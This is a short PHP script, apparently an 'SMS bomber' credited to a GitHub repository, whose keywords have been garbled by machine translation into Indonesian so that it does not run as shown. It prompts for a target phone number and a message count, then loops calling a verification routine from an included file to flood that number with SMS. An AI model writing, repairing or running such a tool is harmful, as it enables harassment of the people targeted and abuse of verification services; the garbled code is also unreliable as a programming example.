<? php
termasuk  ' bomphd.php ' ;
/ *
    https://github.com/nee48/BomSmsPhD
    Dibuat oleh Handika Pratama
    Dimodifikasi oleh ま や ち ゃ ん
* /
$ init  =  Bom baru  ();
// Eksekusi Sms Boomber
echo  " Nomor Target (tanpa 0/62) \ n Input: " ;
$ a  =  trim ( fgets ( STDIN ));
$ init -> no  =  " $ a " ;
echo  " Jumlah Pesan \ n Input: " ;
$ b  =  trim ( fgets ( STDIN ));
$ loop  =  " $ b " ;
untuk ( $ i = 0 ; $ i  <  $ loop ; $ i ++ ) {
    $ init -> Verif ( $ init -> no );
}
